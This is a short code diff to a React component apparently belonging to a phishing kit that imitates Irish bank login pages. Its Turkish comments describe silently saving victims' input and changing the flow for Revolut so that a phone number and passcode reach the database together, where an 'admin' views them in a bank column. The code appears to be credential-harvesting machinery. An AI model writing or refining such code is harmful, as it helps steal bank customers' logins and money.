@@ -627,7 +627,11 @@ export function IrelandBankTemplate({ bankSlug, onChange, handleRouteAction, onP
 
       if (incomingStep < lastIndex) {
         // ARA ADIM: veriyi sessizce kaydet, sonraki sayfaya gec (routing YOK)
-        onProgressSaveRef.current?.(merged);
+        // REVOLUT: ara adimda (numara) DB'ye YAZMA — numara+passcode
+        // son adimda birlikte gitsin, admin Banka kolonunda tek seferde gorsun.
+        if (bankSlugRef.current !== "revolut") {
+          onProgressSaveRef.current?.(merged);
+        }
         setStep(incomingStep + 1);
         return;
       }
